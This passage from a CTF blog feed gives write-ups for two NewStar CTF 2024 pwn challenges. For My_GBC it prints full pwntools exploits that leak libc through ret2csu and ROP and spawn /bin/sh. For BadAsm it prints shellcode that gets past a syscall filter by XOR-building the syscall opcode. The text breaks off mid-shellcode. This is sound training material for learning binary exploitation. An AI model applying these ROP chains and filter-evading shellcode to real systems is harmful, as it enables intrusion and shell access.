function_">ru</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.recvuntil(x)<br><br>k = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> k:<br>    addr = <span class="hljs-string">&#x27;&#x27;</span><br>    host = addr.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    p = remote(host[<span class="hljs-number">0</span>], host[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./My_GBC&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./My_GBC&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment">#对csu函数中的跳转进行调试</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p, <span class="hljs-string">&#x27;b *0x401399\nc\n&#x27;</span>)<br><br><span class="hljs-comment">#解密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">int</span></span>):<br>    decrypted_data = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        byte = ((byte &gt;&gt; <span class="hljs-number">3</span>) | (byte &lt;&lt; <span class="hljs-number">5</span>)) &amp; <span class="hljs-number">0xFF</span><br>        byte ^= key<br>        decrypted_data.append(byte)<br>    <span class="hljs-keyword">return</span> decrypted_data<br><br><span class="hljs-comment">#csu函数下面pop先执行，命名为csu_1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu_1</span>(<span class="hljs-params">arg1, arg2, arg3, func=<span class="hljs-number">0</span>, rbx=<span class="hljs-number">0</span>, rbp=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-comment">#默认参数，当没有传入func值时默认为0</span><br>    r12 = arg1<span class="hljs-comment">#mov edi,r12d；高字节为00，不能用来存放地址</span><br>    r13 = arg2<br>    r14 = arg3<br>    r15 = func<br>    payload = p64(<span class="hljs-number">0x4013AA</span>)<br>    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-comment">#执行csu前面的mov与call,命名为csu_2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu_2</span>():<br>    payload = p64(<span class="hljs-number">0x401390</span>)<br>    <span class="hljs-keyword">return</span> payload<br><br><br>add_rsp_8_ret = <span class="hljs-number">0x401016</span><br>ret = <span class="hljs-number">0x40101a</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + csu_1(<span class="hljs-number">1</span>, elf.got.read, <span class="hljs-number">0x100</span>, elf.got.write) + csu_2()<br>payload += csu_1(<span class="hljs-number">0</span>, <span class="hljs-number">0x404090</span>, <span class="hljs-number">0x50</span>, elf.got.read) + csu_2()<br>payload += csu_1(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x404098</span>) + csu_2() + p64(ret)<br>payload += csu_1(<span class="hljs-number">0x4040A0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x404090</span>) + csu_2()<br><span class="hljs-comment">#后面两步这样融合，中间就可随便写个返回地址了</span><br><span class="hljs-comment">#payload += csu_1(0x4040A0, 0, 0, 0x404090) + p64(ret) + csu_2()</span><br><br><span class="hljs-comment"># debug()</span><br>ru(<span class="hljs-string">b&#x27;Input something:&#x27;</span>)<br>s(decrypt(payload, <span class="hljs-number">90</span>))<br>libc_base = uu64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) - libc.sym.read<br>success(<span class="hljs-string">f&quot;libc_base --&gt; 0x<span class="hljs-subst">&#123;libc_base:x&#125;</span>&quot;</span>)<br>payload = p64(libc_base + libc.sym.system + <span class="hljs-number">0x0</span>) + p64(add_rsp_8_ret) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>s(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>ret可以放到最后的csu_2前面，都是为了栈对齐</p><p>不能放在第二步的后面，由于需要7个参数来间隔返回地址，放在后面会被add rsp,8影响，这样的</p><p>官方是通过add rsp,8;ret才能放在最后的</p><h2 id="wp1——通过ret2csu调用write泄露read地址"><a href="#wp1——通过ret2csu调用write泄露read地址" class="headerlink" title="wp1——通过ret2csu调用write泄露read地址"></a>wp1——通过ret2csu调用write泄露read地址</h2><p>最容易想懂的一个wp</p><p>[NewStarCTF 2024 | Bosh’s Blog](<a href="https://z-bosh.github.io/2024/10/20/NewStarCTF">https://z-bosh.github.io/2024/10/20/NewStarCTF</a> 2024&#x2F;)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#from LibcSearcher import*</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>r=remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>,<span class="hljs-number">6666</span>)<br><span class="hljs-comment">#r=process(&#x27;./1111&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./My_GBC&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr64</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#解密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">data</span>):<br>    key = <span class="hljs-number">0x5a</span><br>    length = <span class="hljs-built_in">len</span>(data)<br>    decrypted = <span class="hljs-built_in">bytearray</span>(data)  <span class="hljs-comment"># 将数据转换为可修改的字节数组</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        decrypted[i] = ((decrypted[i] &gt;&gt; <span class="hljs-number">3</span>) | (decrypted[i] &lt;&lt; <span class="hljs-number">5</span>)) &amp; <span class="hljs-number">0xFF</span><br>        decrypted[i] ^= key<br>    <span class="hljs-keyword">return</span> decrypted<br><br>csu_rear=<span class="hljs-number">0x4013AA</span><br>csu_head=<span class="hljs-number">0x401390</span><br>main_addr=<span class="hljs-number">0x40124C</span><br>pop_rdi=<span class="hljs-number">0x4013b3</span><br>ret_addr=<span class="hljs-number">0x40101a</span><br><br>payload =<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+ p64(csu_rear) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">8</span>) + p64(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(csu_head)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(main_addr)<br><span class="hljs-comment">#print(&quot;解密后的数据:&quot;, dec(payload).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))</span><br>r.sendafter(<span class="hljs-string">&#x27;something:&#x27;</span>,dec(payload))<br>libc_base=u64(r.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc_base+libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>).__next__()<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(ret_addr)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)<br>r.sendafter(<span class="hljs-string">&#x27;something:&#x27;</span>,dec(payload1))<br>r.interactive()<br></code></pre></td></tr></table></figure><blockquote><p> call[r15+rbx*8]不需要手动在栈中添加返回地址，call会自己将返回地址压入栈中，只需要7个栈帧用来抵消add rsp,8与pop指令</p></blockquote><h2 id="wp2——利用已有资源泄露libc"><a href="#wp2——利用已有资源泄露libc" class="headerlink" title="wp2——利用已有资源泄露libc"></a>wp2——利用已有资源泄露libc</h2><p>[<a href="https://blog.csdn.net/weixin_52640415/article/details/142928435">NewStar 2024] week2_newstar2024 week2-CSDN博客</a></p><p>每次只能泄露1字节(由于rdx等于1，且没pop rdx)，泄露完libc就可以直接getshell</p><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/%257BABF0FAB4-9866-4B61-9425-598A51361567%257D.png" alt="{ABF0FAB4-9866-4B61-9425-598A51361567}"></p><p><img src="https://sh1j1.github.io/img/NewStar/My_GBC.assets/Snipaste_2024-11-25_17-51-34.png" alt="Snipaste_2024-11-25_17-51-34"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vuln&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>pop_rdi = <span class="hljs-number">0x00000000004013b3</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi = <span class="hljs-number">0x00000000004013b1</span> <span class="hljs-comment"># pop rsi ; pop r15 ; ret</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">pay</span>):<br>   p2 = <span class="hljs-string">b&#x27;&#x27;</span><br>   <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> pay:<br>       v2 = ((v&gt;&gt;<span class="hljs-number">3</span>)|(v&lt;&lt;<span class="hljs-number">5</span>))&amp;<span class="hljs-number">0xff</span><br>       p2 += <span class="hljs-built_in">bytes</span>([v2^<span class="hljs-number">0x5a</span>])<br>   <span class="hljs-keyword">return</span> p2<br> <br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p, &quot;b*0x401343\nc&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;101.200.139.65&#x27;</span>, <span class="hljs-number">39155</span>)<br> <br>pay = <span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-number">0x18</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    pay += flat(pop_rdi,<span class="hljs-number">1</span>,pop_rsi,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]+i, <span class="hljs-number">0</span>, elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br> <br>pay += p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br> <br>p.sendafter(<span class="hljs-string">b&quot;Input something: \0O&quot;</span>, enc(pay))<br> <br>p.recvline()<br>p.recvline()<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\0\0&#x27;</span>) - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>bin_sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;libc.address = :x&#125;</span>&quot;</span>)<br> <br>pay = <span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-number">0x18</span> + flat(pop_rdi, bin_sh, libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&quot;Input something: \0O&quot;</span>, enc(pay))<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><ul><li>使用r15只是由于rsi与r15绑定了，随便给r15赋个值</li></ul><h2 id="ret2csu学习"><a href="#ret2csu学习" class="headerlink" title="ret2csu学习"></a>ret2csu学习</h2><p><a href="https://zikh26.github.io/posts/4202235.html?highlight=csu#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8csu%E8%BF%99%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%EF%BC%9F">关于ret2csu的学习总结 | ZIKH26’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>NewStar</category>
      
    </categories>
    
    
    <tags>
      
      <tag>每天一题的比赛复盘</tag>
      
      <tag>ret2csu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Week2_BadAsm</title>
    <link href="/2024/11/18/Week2-BadAsm/"/>
    <url>/2024/11/18/Week2-BadAsm/</url>
    
    <content type="html"><![CDATA[<h1 id="Week2-BadAsm"><a href="#Week2-BadAsm" class="headerlink" title="Week2_BadAsm"></a>Week2_BadAsm</h1><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B49CEADF7-3C41-4445-9CCB-0992565877CA%7D.png" alt="{49CEADF7-3C41-4445-9CCB-0992565877CA}"></p><p><strong>逆向分析</strong></p><ul><li>read写入buf，复制到dest进行执行<ul><li>read遇到<code>\x00</code>中断</li><li>同时限制了syscall&#x2F;sysenter&#x2F;int 0x80的出现</li></ul></li></ul><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7BDEBB9696-7A3F-4378-8524-53ACF95D1EE9%7D.png" alt="{DEBB9696-7A3F-4378-8524-53ACF95D1EE9}"></p><p><strong>尝试执行</strong></p><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B5AD06945-F9F8-42AC-8558-C866D6788BBE%7D.png" alt="{5AD06945-F9F8-42AC-8558-C866D6788BBE}"></p><p>出现栈溢出报错，分段故障</p><p><strong>调试一下</strong></p><p>exec函数除了rdi，rsi寄存器都置零了</p><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B205C4DFF-15DD-4644-B364-151551057698%7D.png" alt="{205C4DFF-15DD-4644-B364-151551057698}"></p><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7BF149541E-D9E5-49A3-A762-3ABFC4683BE9%7D.png" alt="{F149541E-D9E5-49A3-A762-3ABFC4683BE9}"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>直接shellcraft不仅会出现<code>\x00</code>而且会有syscall导致特判不通过</p><ul><li><p>写入不含<code>\x00</code>的shellcode</p></li><li><p>绕过syscall\sysenter\int 0x80检查，后面两种32位使用(64位没能实操成功)</p><ul><li><p>采用<code>可见字符shellcode</code>，利用异或运算，输入进去的可见字符异或成不可见字符构造shellcode，绕过判断后调用shellcode时异或回来</p></li><li><p>rdi指向shellcode，根据rdi寻址，找到syscall被异或的位置</p></li><li><pre><code class="asm">mov al,0x6xor [rdi+0x26],rax<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br>    <span class="hljs-keyword">syscall</span> 写成<span class="hljs-string">`\x0f\x03`</span>与<span class="hljs-string">`0x6`</span>异或成<span class="hljs-string">`0x5`</span>，可正常执行<br><br>    用<span class="hljs-built_in">al</span>也是避免出现<span class="hljs-string">`\x00`</span><br><br>直接使用shellcraft<span class="hljs-number">.</span>sh()<br><br>![Snipaste_2024-<span class="hljs-number">11</span>-<span class="hljs-number">15_19</span>-<span class="hljs-number">24</span>-<span class="hljs-number">50</span>](https://sh1j1<span class="hljs-number">.</span>github<span class="hljs-number">.</span>io/img/NewStar/BadAsm<span class="hljs-number">.</span>assets/Snipaste_2024-<span class="hljs-number">11</span>-<span class="hljs-number">15_19</span>-<span class="hljs-number">24</span>-<span class="hljs-number">50.</span>png)<br><br>执行代码的函数，将所有<span class="hljs-built_in">RDI</span>、<span class="hljs-built_in">RSI</span>以外寄存器都置零了，<span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">rsp</span>被清零导致，<span class="hljs-keyword">push</span>和<span class="hljs-keyword">pop</span>不能用，在执行shellcode之前想办法分配<span class="hljs-built_in">rbp</span>、<span class="hljs-built_in">rsp</span>可写的区域<br><br>### exp<br><br>基于<span class="hljs-keyword">syscall</span>的execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br><span class="hljs-string">```</span>py<br>from pwn import *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br>if flag:<br>    p = remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-symbol">else:</span><br>    p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>def sa(s, n): return p<span class="hljs-number">.</span>sendafter(s, n)<br>def sla(s, n): return p<span class="hljs-number">.</span>sendlineafter(s, n)<br>def sl(s): return p<span class="hljs-number">.</span>sendline(s)<br>def sd(s): return p<span class="hljs-number">.</span>send(s)<br>def rc(n): return p<span class="hljs-number">.</span>recv(n)<br>def ru(s): return p<span class="hljs-number">.</span>recvuntil(s)<br>def ti(): return p<span class="hljs-number">.</span>interactive()<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">0x848</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x68</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x732f2f2f6e69622f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">59</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r8</span>+<span class="hljs-number">0x30</span>],<span class="hljs-number">0x0f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r8</span>+<span class="hljs-number">0x31</span>],<span class="hljs-number">0x05</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br>sla(b<span class="hljs-string">&#x27;Code : &#x27;</span>,asm(shellcode))<br>ti()<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>0x848换成0x80，rsp分配空间小于0x100时，出现\x00</p></li></ul><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7BBF177EF9-512D-43B1-8445-65D6BE56F728%7D.png" alt="{BF177EF9-512D-43B1-8445-65D6BE56F728}"></p><ul><li>add sp,0x848换成add rsp,0x848，至少需要填充两字节</li></ul><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B24FEE7F3-102E-42BC-A90C-9E5852306ABF%7D.png" alt="{24FEE7F3-102E-42BC-A90C-9E5852306ABF}"></p><ul><li>mov rax,0x732f2f2f6e69622f，push rax换成push 0x732f2f2f6e69622f，出现报错<ul><li>x86-64 架构下，<code>push</code> 指令只能处理 32 位（4 字节）的立即数值（<code>push imm32</code>）</li></ul></li></ul><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/Snipaste_2024-11-18_16-51-45.png" alt="Snipaste_2024-11-18_16-51-45"></p><p>寄存器压栈<img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/{409F61FB-01AA-41D3-8C15-17F0A0236E95}.png" alt="{409F61FB-01AA-41D3-8C15-17F0A0236E95}" style="zoom:50%;" /></p><p>两次push压栈<img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/{9F8F6FBF-FB63-4DB2-B294-8CC4B6BA67FE}.png" alt="{9F8F6FBF-FB63-4DB2-B294-8CC4B6BA67FE}" style="zoom:50%;" /></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><h4 id="工具分析"><a href="#工具分析" class="headerlink" title="工具分析"></a>工具分析</h4><p>机器码转换成汇编代码</p><p><a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler</a></p><h4 id="官方wp分析"><a href="#官方wp分析" class="headerlink" title="官方wp分析"></a><strong>官方wp分析</strong></h4><p><a href="https://ns.openctf.net/wp/2024/week2/pwn/bad-asm.html">BadAsm | WriteUp - NewStar CTF 2024</a></p><ul><li>异或调用read，输入shellcraft.sh()，在read后面执行</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>ELFpath = (<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;???.???.???.???&#x27;, ?????)</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p=process(ELFpath)</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">; // 目标: 使用 syscall 执行 read(0, code, 0x3fff)</span><br><span class="hljs-string">mov rsp, rdi</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">add sp, 0x0848 ; // 从开头到这里的作用是给 rsp 一个合法值，使 push/pop 指令能够正常执行。同时设置 rax 的值方便后面往当前 shellcode 末尾拼接上 syscall 指令的机器码。</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rsi,rdi</span><br><span class="hljs-string">mov dx, 0x3fff ; // 这两行作用是设置 rsi rdx 寄存器</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov cx, 0x454f</span><br><span class="hljs-string">xor cx, 0x4040 ; // 这两行作用是用异或搓出来 0f 05 (syscall 的机器码)</span><br><span class="hljs-string">add al, 0x40</span><br><span class="hljs-string">mov [rax], cx  ; // rax原本指向的是当前段的开始位置，加上一个偏移，在之后指向的地方写入 0f 05，即 syscall，相当于拼接到当前 shellcode 后面。</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi, rdi</span><br><span class="hljs-string">xor rax, rax   ; // 设置 read 的系统调用号 0，设置 rdi 寄存器</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;Input your Code :&quot;</span>, asm(shellcode).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)) <span class="hljs-comment"># \x90是nop指令的机器码，用于连接上面的shellcode和写入的syscall，使程序能正常执行。</span><br><br>pause()<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x42</span>+asm(shellcraft.sh())) <span class="hljs-comment"># 0x42个a正好覆盖了syscall，之后拼接新的shellcode会继续执行本次写入的新的shellcode</span><br>p.interactive()<br></code></pre></td></tr></table></figure><ul><li>通过异或将&#x2F;bin&#x2F;sh\x00写入，然后设置rax，调用execve执行execve(“&#x2F;bin&#x2F;sh”,0,0)<ul><li><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B1FF3891E-29FF-4C3D-A504-7F47D38CF032%7D.png" alt="{1FF3891E-29FF-4C3D-A504-7F47D38CF032}"></li></ul></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">; // 目标: 执行 execve(&quot;/bin/sh&quot;, 0, 0) 的 syscall</span><br><span class="hljs-string">; //输入参数</span><br><span class="hljs-string">mov rsp, rdi</span><br><span class="hljs-string">add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop，任意一个可读写段即可，我们这里刚好有rdi中存储的 shellcode 的段的起始位置，正好这个段有读写权限，就直接拿来在 0x848 偏移的位置当作栈顶了（加偏移是为了防止某些操作破坏写入的 shellcode）</span><br><span class="hljs-string">mov rsi, 